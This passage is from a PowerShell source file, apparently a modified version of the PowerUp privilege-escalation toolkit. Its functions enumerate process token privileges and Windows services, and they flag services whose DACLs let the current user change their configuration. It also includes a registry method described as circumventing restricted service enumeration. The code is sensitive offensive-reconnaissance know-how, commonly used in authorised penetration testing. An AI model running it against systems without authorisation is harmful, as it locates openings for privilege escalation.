            $Success = $Advapi32::GetTokenInformation($TokenHandle, 2, $TokenGroupsPtr, $TokenGroupsPtrSize, [ref]$TokenGroupsPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenGroups = $TokenGroupsPtr -as $TOKEN_GROUPS
                For ($i=0; $i -lt $TokenGroups.GroupCount; $i++) {
                    # convert each token group SID to a displayable string

                    if ($TokenGroups.Groups[$i].SID) {
                        $SidString = ''
                        $Result = $Advapi32::ConvertSidToStringSid($TokenGroups.Groups[$i].SID, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($Result -eq 0) {
                            Write-Verbose "Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            $GroupSid = New-Object PSObject
                            $GroupSid | Add-Member Noteproperty 'SID' $SidString
                            # cast the atttributes field as our SidAttributes enum
                            $GroupSid | Add-Member Noteproperty 'Attributes' ($TokenGroups.Groups[$i].Attributes -as $SidAttributes)
                            $GroupSid | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                            $GroupSid.PSObject.TypeNames.Insert(0, 'PowerUp.TokenGroup')
                            $GroupSid
                        }
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenGroupsPtr)
        }
        elseif ($InformationClass -eq 'Privileges') {
            # query the process token with the TOKEN_INFORMATION_CLASS = 3 enum to retrieve a TOKEN_PRIVILEGES structure

            # initial query to determine the necessary buffer size
            $TokenPrivilegesPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, 0, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize)
            [IntPtr]$TokenPrivilegesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivilegesPtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 3, $TokenPrivilegesPtr, $TokenPrivilegesPtrSize, [ref]$TokenPrivilegesPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenPrivileges = $TokenPrivilegesPtr -as $TOKEN_PRIVILEGES
                For ($i=0; $i -lt $TokenPrivileges.PrivilegeCount; $i++) {
                    $Privilege = New-Object PSObject
                    $Privilege | Add-Member Noteproperty 'Privilege' $TokenPrivileges.Privileges[$i].Luid.LowPart.ToString()
                    # cast the lower Luid field as our LuidAttributes enum
                    $Privilege | Add-Member Noteproperty 'Attributes' ($TokenPrivileges.Privileges[$i].Attributes -as $LuidAttributes)
                    $Privilege | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                    $Privilege.PSObject.TypeNames.Insert(0, 'PowerUp.TokenPrivilege')
                    $Privilege
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesPtr)
        }
        else {
            $TokenResult = New-Object PSObject

            # query the process token with the TOKEN_INFORMATION_CLASS = 8 enum to retrieve a TOKEN_TYPE enum

            # initial query to determine the necessary buffer size
            $TokenTypePtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenTypePtrSize, [ref]$TokenTypePtrSize)
            [IntPtr]$TokenTypePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenTypePtrSize)

            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenTypePtr, $TokenTypePtrSize, [ref]$TokenTypePtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $Temp = $TokenTypePtr -as $TOKEN_TYPE
                $TokenResult | Add-Member Noteproperty 'Type' $Temp.Type
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenTypePtr)

            # now query the process token with the TOKEN_INFORMATION_CLASS = 8 enum to retrieve a SECURITY_IMPERSONATION_LEVEL enum

            # initial query to determine the necessary buffer size
            $TokenImpersonationLevelPtrSize = 0
            $Success = $Advapi32::GetTokenInformation($TokenHandle, 8, 0, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize)
            [IntPtr]$TokenImpersonationLevelPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenImpersonationLevelPtrSize)

            $Success2 = $Advapi32::GetTokenInformation($TokenHandle, 8, $TokenImpersonationLevelPtr, $TokenImpersonationLevelPtrSize, [ref]$TokenImpersonationLevelPtrSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success2) {
                $Temp = $TokenImpersonationLevelPtr -as $IMPERSONATION_LEVEL
                $TokenResult | Add-Member Noteproperty 'ImpersonationLevel' $Temp.ImpersonationLevel
                $TokenResult | Add-Member Noteproperty 'TokenHandle' $TokenHandle
                $TokenResult.PSObject.TypeNames.Insert(0, 'PowerUp.TokenType')
                $TokenResult
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenImpersonationLevelPtr)
        }
    }
}


function Get-ProcessTokenGroup {
<#
.SYNOPSIS

Returns all SIDs that the current token context is a part of, whether they are disabled or not.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Get-TokenInformation  

.DESCRIPTION

First, if a process ID is passed, then the process is opened using OpenProcess(),
otherwise GetCurrentProcess() is used to open up a pseudohandle to the current process.
OpenProcessToken() is then used to get a handle to the specified process token. The token
is then passed to Get-TokenInformation to query the current token groups for the specified
token.

.PARAMETER Id

The process ID to enumerate token groups for, otherwise defaults to the current process.

.EXAMPLE

Get-ProcessTokenGroup

SID                          Attributes         TokenHandle           ProcessId
---                          ----------         -----------           ---------
S-1-5-21-8901718... ...SE_GROUP_ENABLED                1616                3684
S-1-1-0             ...SE_GROUP_ENABLED                1616                3684
S-1-5-32-544        ..., SE_GROUP_OWNER                1616                3684
S-1-5-32-545        ...SE_GROUP_ENABLED                1616                3684
S-1-5-4             ...SE_GROUP_ENABLED                1616                3684
S-1-2-1             ...SE_GROUP_ENABLED                1616                3684
S-1-5-11            ...SE_GROUP_ENABLED                1616                3684
S-1-5-15            ...SE_GROUP_ENABLED                1616                3684
S-1-5-5-0-1053459   ...NTEGRITY_ENABLED                1616                3684
S-1-2-0             ...SE_GROUP_ENABLED                1616                3684
S-1-18-1            ...SE_GROUP_ENABLED                1616                3684
S-1-16-12288                                           1616                3684

.EXAMPLE

Get-Process notepad | Get-ProcessTokenGroup

SID                          Attributes         TokenHandle           ProcessId
---                          ----------         -----------           ---------
S-1-5-21-8901718... ...SE_GROUP_ENABLED                1892                2044
S-1-1-0             ...SE_GROUP_ENABLED                1892                2044
S-1-5-32-544        ...SE_FOR_DENY_ONLY                1892                2044
S-1-5-32-545        ...SE_GROUP_ENABLED                1892                2044
S-1-5-4             ...SE_GROUP_ENABLED                1892                2044
S-1-2-1             ...SE_GROUP_ENABLED                1892                2044
S-1-5-11            ...SE_GROUP_ENABLED                1892                2044
S-1-5-15            ...SE_GROUP_ENABLED                1892                2044
S-1-5-5-0-1053459   ...NTEGRITY_ENABLED                1892                2044
S-1-2-0             ...SE_GROUP_ENABLED                1892                2044
S-1-18-1            ...SE_GROUP_ENABLED                1892                2044
S-1-16-8192                                            1892                2044


.OUTPUTS

PowerUp.TokenGroup

Outputs a custom object containing the token group (SID/attributes) for the specified process.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenGroups = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Groups'
                $TokenGroups | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Get-ProcessTokenPrivilege {
<#
.SYNOPSIS

Returns all privileges for the current (or specified) process ID.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Get-TokenInformation  

.DESCRIPTION

First, if a process ID is passed, then the process is opened using OpenProcess(),
otherwise GetCurrentProcess() is used to open up a pseudohandle to the current process.
OpenProcessToken() is then used to get a handle to the specified process token. The token
is then passed to Get-TokenInformation to query the current privileges for the specified
token.

.PARAMETER Id

The process ID to enumerate token groups for, otherwise defaults to the current process.

.PARAMETER Special

Switch. Only return 'special' privileges, meaning admin-level privileges.
These include SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege,
SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeTcbPrivilege.

.EXAMPLE

Get-ProcessTokenPrivilege | ft -a

WARNING: 2 columns do not fit into the display and were removed.

Privilege                                                            Attributes
---------                                                            ----------
SeUnsolicitedInputPrivilege                                            DISABLED
SeTcbPrivilege                                                         DISABLED
SeSecurityPrivilege                                                    DISABLED
SeTakeOwnershipPrivilege                                               DISABLED
SeLoadDriverPrivilege                                                  DISABLED
SeSystemProfilePrivilege                                               DISABLED
SeSystemtimePrivilege                                                  DISABLED
SeProfileSingleProcessPrivilege                                        DISABLED
SeIncreaseBasePriorityPrivilege                                        DISABLED
SeCreatePagefilePrivilege                                              DISABLED
SeBackupPrivilege                                                      DISABLED
SeRestorePrivilege                                                     DISABLED
SeShutdownPrivilege                                                    DISABLED
SeDebugPrivilege                                           SE_PRIVILEGE_ENABLED
SeSystemEnvironmentPrivilege                                           DISABLED
SeChangeNotifyPrivilege         ...EGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
SeRemoteShutdownPrivilege                                              DISABLED
SeUndockPrivilege                                                      DISABLED
SeManageVolumePrivilege                                                DISABLED
SeImpersonatePrivilege          ...EGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
SeCreateGlobalPrivilege         ...EGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
SeIncreaseWorkingSetPrivilege                                          DISABLED
SeTimeZonePrivilege                                                    DISABLED
SeCreateSymbolicLinkPrivilege                                          DISABLED

.EXAMPLE

Get-ProcessTokenPrivilege -Special

Privilege                    Attributes         TokenHandle           ProcessId
---------                    ----------         -----------           ---------
SeTcbPrivilege                 DISABLED                2268                3684
SeSecurityPrivilege            DISABLED                2268                3684
SeTakeOwnershipP...            DISABLED                2268                3684
SeLoadDriverPriv...            DISABLED                2268                3684
SeBackupPrivilege              DISABLED                2268                3684
SeRestorePrivilege             DISABLED                2268                3684
SeDebugPrivilege    ...RIVILEGE_ENABLED                2268                3684
SeSystemEnvironm...            DISABLED                2268                3684
SeImpersonatePri... ...RIVILEGE_ENABLED                2268                3684

.EXAMPLE

Get-Process notepad | Get-ProcessTokenPrivilege | fl

Privilege   : SeShutdownPrivilege
Attributes  : DISABLED
TokenHandle : 2164
ProcessId   : 2044

Privilege   : SeChangeNotifyPrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2164
ProcessId   : 2044

Privilege   : SeUndockPrivilege
Attributes  : DISABLED
TokenHandle : 2164
ProcessId   : 2044

Privilege   : SeIncreaseWorkingSetPrivilege
Attributes  : DISABLED
TokenHandle : 2164
ProcessId   : 2044

Privilege   : SeTimeZonePrivilege
Attributes  : DISABLED
TokenHandle : 2164
ProcessId   : 2044

.OUTPUTS

PowerUp.TokenPrivilege

Outputs a custom object containing the token privilege (name/attributes) for the specified process.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id,

        [Switch]
        [Alias('Privileged')]
        $Special
    )

    BEGIN {
        $SpecialPrivileges = @('SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege', 'SeSystemEnvironmentPrivilege', 'SeImpersonatePrivilege', 'SeTcbPrivilege')
    }

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($Success) {
                Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Privileges' | ForEach-Object {
                    if ($PSBoundParameters['Special']) {
                        if ($SpecialPrivileges -Contains $_.Privilege) {
                            $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                            $_ | Add-Member Aliasproperty Name ProcessId
                            $_
                        }
                    }
                    else {
                        $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                        $_
                    }
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Get-ProcessTokenType {
<#
.SYNOPSIS

Returns the token type and impersonation level.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Get-TokenInformation  

.DESCRIPTION

First, if a process ID is passed, then the process is opened using OpenProcess(),
otherwise GetCurrentProcess() is used to open up a pseudohandle to the current process.
OpenProcessToken() is then used to get a handle to the specified process token. The token
is then passed to Get-TokenInformation to query the type and impersonation level for the
specified token.

.PARAMETER Id

The process ID to enumerate token groups for, otherwise defaults to the current process.

.EXAMPLE

Get-ProcessTokenType

               Type  ImpersonationLevel         TokenHandle           ProcessId
               ----  ------------------         -----------           ---------
            Primary      Identification                 872                3684


.EXAMPLE

Get-Process notepad | Get-ProcessTokenType | fl

Type               : Primary
ImpersonationLevel : Identification
TokenHandle        : 1356
ProcessId          : 2044

.OUTPUTS

PowerUp.TokenType

Outputs a custom object containing the token type and impersonation level for the specified process.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenType')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $Id
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $ProcessHandle = $Kernel32::OpenProcess(0x400, $False, $Id);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ProcessHandle -eq 0) {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }
            else {
                $ProcessID = $Id
            }
        }
        else {
            # open up a pseudo handle to the current process- don't need to worry about closing
            $ProcessHandle = $Kernel32::GetCurrentProcess()
            $ProcessID = $PID
        }

        if ($ProcessHandle) {
            [IntPtr]$hProcToken = [IntPtr]::Zero
            $TOKEN_QUERY = 0x0008
            $Success = $Advapi32::OpenProcessToken($ProcessHandle, $TOKEN_QUERY, [ref]$hProcToken);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($Success) {
                $TokenType = Get-TokenInformation -TokenHandle $hProcToken -InformationClass 'Type'
                $TokenType | ForEach-Object {
                    $_ | Add-Member Noteproperty 'ProcessId' $ProcessID
                    $_
                }
            }
            else {
                Write-Warning ([ComponentModel.Win32Exception] $LastError)
            }

            if ($PSBoundParameters['Id']) {
                # close the handle if we used OpenProcess()
                $Null = $Kernel32::CloseHandle($ProcessHandle)
            }
        }
    }
}


function Test-ServiceDaclPermission {
<#
.SYNOPSIS

Expects a set of PowerUp.Service objects as input and returns PowerUp.Service objects where the current
user has modification permissions.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause  
Required Dependencies:

.DESCRIPTION

This function is basically a copy of the plain Test-ServiceDaclPermission cmdlet of PowerUp.
However, PowerUp used this method to do both: Obtaining the DACL and checking for vulnerable
permissions. This is not flexible, as there are different methods obtaining the DACL of a service.
This version of the function assumes PowerUp.Service objects that get a DACL property assigned during
their creation.

.PARAMETER Services

An array of PowerUp.Service objects.

.PARAMETER Permissions

A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead'.

.PARAMETER PermissionSet

A pre-defined permission set to test a specified service against. 'ChangeConfig' or 'Restart'.

.EXAMPLE

Get-ServiceApi | Test-ServiceDaclPermission | Show-ServicePermissions

Service      Principal                ObjectName                                                                                Permissions
-------      ---------                ----------                                                                                -----------
UmRdpService NT AUTHORITY\INTERACTIVE localSystem     QueryConfig, ChangeConfig, QueryStatus, EnumerateDependents, Interrogate, ReadControl

Return all service objects where the current user can modify the service configuration.

.OUTPUTS

PowerUp.Service
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [PSObject[]]
        [ValidateNotNullOrEmpty()]
        $Services,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead')]
        $Permissions,

        [String]
        [ValidateSet('ChangeConfig', 'Restart')]
        $PermissionSet = 'ChangeConfig'
    )

    BEGIN {
        $AccessMask = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
        }

        $CheckAllPermissionsInSet = $False

        if ($PSBoundParameters['Permissions']) {
            $TargetPermission = 0
            foreach($permission in $Permissions) {
                $TargetPermission = $TargetPermission -bxor $AccessMask[$Permission]
            }
        }
        else {
            if ($PermissionSet -eq 'ChangeConfig') {
                $TargetPermission = 0x500c0002
            }
            elseif ($PermissionSet -eq 'Restart') {
                $TargetPermission = 0x30
                $CheckAllPermissionsInSet = $True # so we check all permissions && style
            }
        }

        $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $CurrentUserSids = $UserIdentity.Groups | Select-Object -ExpandProperty Value
        $CurrentUserSids += $UserIdentity.User.Value
    }

    PROCESS {

        ForEach($TargetService in $Services) {

            if( $TargetService.Dacl -eq $null ) {
                Write-Verbose "Skipping: $($TargetService.Name) [No DACL]"
                continue
            }

            ForEach($ServiceDacl in $TargetService.Dacl) {

                if ($CurrentUserSids -contains $ServiceDacl.SecurityIdentifier) {

                    if ($CheckAllPermissionsInSet) {
                        if (($ServiceDacl.AccessMask -band $TargetPermission) -eq $TargetPermission) {
                            $TargetService
                        }
                    }
                    else {
                        if (($ServiceDacl.AceType -eq 'AccessAllowed') -and ($ServiceDacl.AccessMask -band $TargetPermission)) {
                            $TargetService
                        }
                    }
                }
            }
        }
    }
}


########################################################
#
# Service enumeration
#
########################################################

function Get-ServiceReg {
<#
.SYNOPSIS

Enumerates services using the HKLM:\SYSTEM\CurrentControlSet\Services registry hive.
This circumvents restricted access to ordinary service enumeration like sc.exe or Get-Service.

Author: Tobias Neitzel
License: BSD 3-Clause  
Required Dependencies: ServiceAccessRights (Enum)  

.DESCRIPTION

Queries the HKLM:\SYSTEM\CurrentControlSet\Services Hive and enumerates all present services.

.PARAMETER Verbose

Switch. Show warning messages for services with non existing image paths

.PARAMETER IncludeDrivers

Switch. Include services associated with kernel and filesystem drivers

.EXAMPLE

Get-ServiceReg 

Name             : AJRouter
ServiceName      : AJRouter
DisplayName      : @%SystemRoot%\system32\AJRouter.dll,-2
RequiredServices : 
StartType        : Manual
ObtainedBy       : Registry
ObjectName       : NT AUTHORITY\LocalService
PathName         : C:\Program Files\AjRouter\Routing Solutions\aj-start.exe
Dacl             : {System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce...}

[...]

Get all non driver services that are available inside the registry.

.OUTPUTS

PowerUp.Service
#>
    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    param(
        [Switch]
        $IncludeDrivers
    )

    $StartupTypes = @{
        0 = 'On Boot'
        1 = 'System Controlled'
        2 = 'Autostart'
        3 = 'Manual'
        4 = 'Disabled'
        999 = 'unknown'
    }

    $DefaultSddl = 'D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CR;;;AU)'
    $DefaultSD =  New-Object Security.AccessControl.CommonSecurityDescriptor $false,$false,$DefaultSddl

    Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services' | ForEach-Object {

        $ServiceName = $_.PSChildName
        $PathName = $_.GetValue("ImagePath")
        $Type = $_.GetValue("Type")
        $StartupType = if($_.GetValue("Start") -eq $null) { "999" } else { $_.GetValue("Start") }

        if( ($Type -band  0x3) -and (-not $IncludeDrivers) ){
            Write-Verbose "Skipping: $ServiceName [Driver]"
            return
        }

        $Service = New-Object PSObject
        $Service | Add-Member -MemberType NoteProperty -Name Name -Value $ServiceName
        $Service | Add-Member -MemberType NoteProperty -Name ServiceName -Value $ServiceName
        $Service | Add-Member -MemberType NoteProperty -Name DisplayName -Value $_.GetValue("DisplayName")
        $Service | Add-Member -MemberType NoteProperty -Name RequiredServices -Value  $_.GetValue("DependOnService")
        $Service | Add-Member -MemberType NoteProperty -Name StartType -Value $StartupTypes[$StartupType]
        $Service | Add-Member -MemberType NoteProperty -Name ObtainedBy -Value "Registry"
        $Service | Add-Member -MemberType NoteProperty -Name ObjectName -Value $_.GetValue("ObjectName")
        $Service | Add-Member -MemberType NoteProperty -Name PathName -Value $PathName

        try {
            $Key = $_.OpenSubKey("Security")
        } catch [System.Management.Automation.MethodException] {
            Write-Verbose "Failure obtaining Security key for $ServiceName [Access Denied]"
            $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
            return $Service
        }

        try {

            if( $Key -eq $null ) {
                $RawSecurityDescriptor = $DefaultSD
            } else {
                $Sec = $Key.GetValue("Security")
                $RawSecurityDescriptor = New-Object Security.AccessControl.CommonSecurityDescriptor $false,$false,$Sec,0
            }

            $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
                Add-Member -InputObject $_ -MemberType NoteProperty -Name AccessRights -Value ($_.AccessMask -as $ServiceAccessRights) -PassThru
            }
            $Service | Add-Member -MemberType NoteProperty -Name Dacl -Value  $Dacl

        } catch [System.Management.Automation.MethodException] {
            Write-Verbose "Failure parsing Security key for $ServiceName [Parsing Error]"
        } finally {
            $Service.PSObject.TypeNames.Insert(0, 'PowerUp.Service')
            $Service
        }
    }
}


function Get-ServiceApi {
<#
.SYNOPSIS

Enumerates services using reflection. First, the function obtains available service names using the
ServiceController.GetServices function. Then, it uses QueryServiceConfig of Advapi32 to obtain additional
service information.

Author: Tobias Neitzel (@qtc-de)
License: BSD 3-Clause  
Required Dependencies: PSReflect

.DESCRIPTION

This function utilizes different Windows APIs to enumerate services. To get all information for a service, the
invoking user needs the ReadControl (0x20000) and QueryConfig (0x0001) permissions for that particular service.

.PARAMETER Verbose

Switch. Show warnings.

.EXAMPLE

Get-ServiceApi

Name             : AJRouter
ServiceName      : AJRouter
DisplayName      : AllJoyn Router Service
RequiredServices : {}
StartType        : Manual
ObtainedBy       : API
ObjectName       : NT AUTHORITY\LocalService
PathName         : C:\Program Files\AjRouter\Routing Solutions\aj-start.exe
Dacl             : {System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce, System.Security.AccessControl.CommonAce...}

Get all services that are available on the system.

.OUTPUTS

PowerUp.Service
#>

    [OutputType('PowerUp.Service')]
    [CmdletBinding()]
    param()

    Add-Type -AssemblyName system.serviceprocess
    $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
    $GetServiceHandle = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
    $QueryConfig = 0x00001
    $ReadControl = 0x20000

    $GetServices.Invoke($null, $null) | ForEach-Object {

        $Service = New-Object PSObject
        $Service | Add-Member -MemberType NoteProperty -Name Name -Value $_.Name
        $Service | Add-Member -MemberType NoteProperty -Name ServiceName -Value $_.ServiceName
        $Service | Add-Member -MemberType NoteProperty -Name DisplayName -Value $_.DisplayName
        $Service | Add-Member -MemberType NoteProperty -Name RequiredServices -Value  $_.RequiredServices
        $Service | Add-Member -MemberType NoteProperty -Name StartType -Value  $_.StartType
        $Service | Add-Member -MemberType NoteProperty -Name ObtainedBy -Value  "API"

        try {
            $ServiceHandle = $GetServiceHandle.Invoke($_, @($QueryConfig))
            $RequestedSize = 0
            $Result = $Advapi32::QueryServiceConfig($ServiceHandle, [IntPtr]::Zero, 0,[Ref]$RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error();

            if( ($LastError -eq 122) -and ($RequestedSize -gt 0)) {

                [IntPtr]$Struct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($RequestedSize)
                $Result = $Advapi32::QueryServiceConfig($ServiceHandle, $Struct, $RequestedSize, [Ref]$RequestedSize);

                if( $Result ) {
                    $ServiceInfo = $Struct -as $SERVICE_INFORMATION
                    $Service | Add-Member -MemberType NoteProperty -Name ObjectName -Value $ServiceInfo.lpServiceStartName
                    $Service | Add-Member -MemberType NoteProperty -Name PathName -Value $ServiceInfo.lpBinaryPathName
                }
            }
        } catch {
        } finally {
            $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
        }

        try {
            $ServiceHandle = $GetServiceHandle.Invoke($_, @($ReadControl))
            $RequestedSize = $null
            $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref]$RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if(($LastError -eq 122) -and ($RequestedSize -gt 0)) {

                $BinarySecurityDescriptor = New-Object Byte[]($RequestedSize)
                $Result = $Advapi32::QueryServiceObjectSecurity($ServiceHandle, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $BinarySecurityDescriptor, $BinarySecurityDescriptor.Count, [Ref] $RequestedSize);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if( $Result ) {
                    $RawSecurityDescriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $BinarySecurityDescriptor, 0
                    $Dacl = $RawSecurityDescriptor.DiscretionaryAcl | ForEach-Object {
